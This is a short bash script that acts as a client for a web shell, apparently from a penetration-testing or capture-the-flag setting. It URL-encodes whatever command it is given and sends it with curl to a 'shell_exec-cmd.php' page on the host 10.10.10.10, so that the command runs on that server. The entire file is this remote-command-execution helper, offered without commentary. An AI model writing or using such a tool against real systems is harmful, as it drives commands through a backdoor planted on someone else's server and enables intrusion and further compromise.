#!/bin/bash
URL="http://10.10.10.10/shell_exec-cmd.php"
CMD=`echo ${*} | sed s'/ /%20/g'`
CMD=`echo ${CMD} | sed s'/&/%26/g'`
CMD=`echo ${CMD} | sed s'/>/%3e/g'`
#echo ${URL}?cmd=${CMD}
curl -s ${URL}?cmd=${CMD}